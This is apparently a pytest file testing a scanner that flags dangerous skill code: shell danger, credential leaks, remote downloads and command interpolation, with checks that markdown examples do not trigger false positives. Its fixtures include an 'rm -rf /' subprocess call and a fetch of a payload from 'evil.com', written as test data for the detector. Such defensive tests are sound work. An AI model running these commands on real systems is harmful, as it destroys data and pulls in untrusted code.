"""Tests for saturnday.guard.openclaw_scanner."""

from pathlib import Path

import pytest

from saturnday.guard.cloud_scanner import (
    Finding,
    SkillScanResult,
    discover_skills,
    scan_skill,
    scan_corpus,
)
from saturnday.guard.publish_preflight import run_publish_preflight


def _create_skill(tmp_path: Path, name: str = "my-skill", content: str = "") -> Path:
    """Helper: create a minimal skill directory."""
    skill_dir = tmp_path / name
    skill_dir.mkdir(parents=True)
    skill_md = skill_dir / "SKILL.md"
    skill_md.write_text(
        content or "# My Skill\n\nA test skill for unit testing purposes.\n"
        "This skill does something useful for developers.\n",
        encoding="utf-8",
    )
    return skill_dir


class TestDiscoverSkills:
    def test_finds_skill_dirs(self, tmp_path: Path) -> None:
        _create_skill(tmp_path, "skill-a")
        _create_skill(tmp_path, "skill-b")
        skills = discover_skills(tmp_path)
        assert len(skills) == 2

    def test_excludes_node_modules(self, tmp_path: Path) -> None:
        nm = tmp_path / "node_modules" / "bad-skill"
        nm.mkdir(parents=True)
        (nm / "SKILL.md").write_text("# Bad", encoding="utf-8")
        _create_skill(tmp_path, "good-skill")
        skills = discover_skills(tmp_path)
        assert len(skills) == 1

    def test_empty_corpus(self, tmp_path: Path) -> None:
        skills = discover_skills(tmp_path)
        assert skills == []


class TestScanSkill:
    def test_clean_skill_passes(self, tmp_path: Path) -> None:
        skill_dir = _create_skill(tmp_path)
        result = scan_skill(skill_dir)
        assert result.status == "scanned"
        # Only low-severity findings (no tests, no license) expected
        assert all(f.severity in ("low", "info") for f in result.findings)

    def test_missing_skill_md(self, tmp_path: Path) -> None:
        skill_dir = tmp_path / "empty-skill"
        skill_dir.mkdir()
        result = scan_skill(skill_dir)
        assert result.status == "skipped"

    def test_shell_danger_detected(self, tmp_path: Path) -> None:
        skill_dir = _create_skill(tmp_path)
        script = skill_dir / "run.py"
        script.write_text(
            "import subprocess\nsubprocess.call('rm -rf /')\n",
            encoding="utf-8",
        )
        result = scan_skill(skill_dir)
        shell_findings = [f for f in result.findings if f.check == "shell_danger"]
        assert len(shell_findings) > 0
        assert result.disposition == "FAIL"

    def test_credential_leak_detected(self, tmp_path: Path) -> None:
        skill_dir = _create_skill(tmp_path)
        config = skill_dir / "config.py"
        config.write_text(
            'API_KEY = "sk-ant-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
            'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"\n',
            encoding="utf-8",
        )
        result = scan_skill(skill_dir)
        cred_findings = [f for f in result.findings if f.check == "credential_leak"]
        assert len(cred_findings) > 0

    def test_remote_download_detected(self, tmp_path: Path) -> None:
        skill_dir = _create_skill(tmp_path)
        fetcher = skill_dir / "fetch.py"
        fetcher.write_text(
            "import urllib.request\nurllib.request.urlretrieve('http://evil.com/payload')\n",
            encoding="utf-8",
        )
        result = scan_skill(skill_dir)
        dl_findings = [f for f in result.findings if f.check == "remote_download"]
        assert len(dl_findings) > 0

    def test_command_interpolation_detected(self, tmp_path: Path) -> None:
        skill_dir = _create_skill(tmp_path)
        script = skill_dir / "script.py"
        script.write_text(
            'import subprocess\nsubprocess.run(f"echo {user_input}")\n',
            encoding="utf-8",
        )
        result = scan_skill(skill_dir)
        inj_findings = [f for f in result.findings if f.check == "command_interpolation"]
        assert len(inj_findings) > 0

    def test_thin_skill_md(self, tmp_path: Path) -> None:
        skill_dir = _create_skill(tmp_path, content="# X\nShort.")
        result = scan_skill(skill_dir)
        struct_findings = [f for f in result.findings if f.kind == "thin_skill_md"]
        assert len(struct_findings) > 0


class TestScanCorpus:
    def test_scans_multiple_skills(self, tmp_path: Path) -> None:
        corpus = tmp_path / "corpus"
        corpus.mkdir()
        _create_skill(corpus, "skill-a")
        _create_skill(corpus, "skill-b")
        output = tmp_path / "output"
        summary = scan_corpus(corpus, output)
        assert summary.total_scanned == 2
        assert (output / "findings.jsonl").exists()

    def test_limit(self, tmp_path: Path) -> None:
        corpus = tmp_path / "corpus"
        corpus.mkdir()
        for i in range(5):
            _create_skill(corpus, f"skill-{i}")
        output = tmp_path / "output"
        summary = scan_corpus(corpus, output, limit=2)
        assert summary.total_scanned == 2


class TestFinding:
    def test_to_dict(self) -> None:
        f = Finding(
            check="shell_danger",
            severity="high",
            file="run.py",
            line=5,
            message="Dangerous call",
            kind="shell_danger",
        )
        d = f.to_dict()
        assert d["check"] == "shell_danger"
        assert d["severity"] == "high"
        assert d["file"] == "run.py"
        assert d["line"] == 5


class TestMarkdownFalsePositives:
    """Regression tests: markdown files must not trigger security check false positives."""

    def test_markdown_fenced_code_no_false_positive(self, tmp_path: Path) -> None:
        """Code fences in README.md must not produce shell_danger findings."""
        skill_dir = _create_skill(tmp_path)
        readme = skill_dir / "README.md"
        readme.write_text(
            "# Usage\n\nRun the skill:\n\n"
            "```bash\n"
            "subprocess.call(['echo', 'hello'])\n"
            'eval("some code")\n'
            "```\n",
            encoding="utf-8",
        )
        result = scan_skill(skill_dir)
        shell_findings = [
            f for f in result.findings
            if f.check == "shell_danger" and f.file == "README.md"
        ]
        assert shell_findings == [], (
            f"Expected zero shell_danger findings from README.md, got: {shell_findings}"
        )

    def test_real_shell_danger_in_python_still_detected(self, tmp_path: Path) -> None:
        """Shell danger in a .py file must still be detected after the md exclusion."""
        skill_dir = _create_skill(tmp_path)
        run_py = skill_dir / "run.py"
        run_py.write_text(
            "import subprocess\nsubprocess.call('rm -rf /')\n",
            encoding="utf-8",
        )
        result = scan_skill(skill_dir)
        shell_findings = [f for f in result.findings if f.check == "shell_danger"]
        assert len(shell_findings) > 0, (
            "Expected shell_danger finding in run.py but none found"
        )

    def test_markdown_credential_example_no_false_positive(self, tmp_path: Path) -> None:
        """Credential-like strings inside markdown code fences must not raise findings."""
        skill_dir = _create_skill(tmp_path)
        readme = skill_dir / "README.md"
        readme.write_text(
            "# Configuration\n\n"
            "Set your key:\n\n"
            "```python\n"
            'ANTHROPIC_API_KEY = "sk-ant-example"\n'
            "```\n",
            encoding="utf-8",
        )
        result = scan_skill(skill_dir)
        cred_findings = [
            f for f in result.findings
            if f.check == "credential_leak" and f.file == "README.md"
        ]
        assert cred_findings == [], (
            f"Expected zero credential_leak findings from README.md, got: {cred_findings}"
        )

    def test_publish_preflight_passes_with_markdown_docs(self, tmp_path: Path) -> None:
        """publish_preflight must not block a clean skill that has markdown doc examples."""
        skill_dir = _create_skill(tmp_path)
        readme = skill_dir / "README.md"
        readme.write_text(
            "# My Skill\n\n"
            "Example usage:\n\n"
            "```bash\n"
            "subprocess.call(['ls', '-la'])\n"
            'eval("2 + 2")\n'
            "```\n",
            encoding="utf-8",
        )
        result = run_publish_preflight(skill_dir)
        assert result.allowed, (
            f"Expected publish_preflight to pass, but it was blocked: "
            f"{result.blocking_reasons}"
        )
